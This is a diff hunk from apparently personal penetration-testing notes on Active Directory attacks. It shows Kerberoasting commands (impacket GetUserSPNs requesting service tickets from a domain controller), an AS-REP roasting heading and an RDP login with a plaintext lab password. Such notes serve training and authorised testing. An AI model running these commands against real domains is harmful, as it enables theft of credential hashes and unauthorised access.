@@ -1207,7 +1207,7 @@ Login to DC
     `kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete`
   - Python  
     `kali@kali:~$ GetUserSPNs.py -request -dc-ip 192.168.188.70 corp.com/`
-- AS-REP roast (accounts without preauth)
+- AS-REP roast (accounts without preauth) - Kali Pre-attack with a valid credential
   - **DC1 pete**  
     `xfreerdp3 /u:pete /d:corp.com /p:'Nexus123!' /v:192.168.200.70 /cert:ignore /drive:share,/home/kali/share`  
   - Find Vulnerable Users Does not require Kerberos preauthentication  
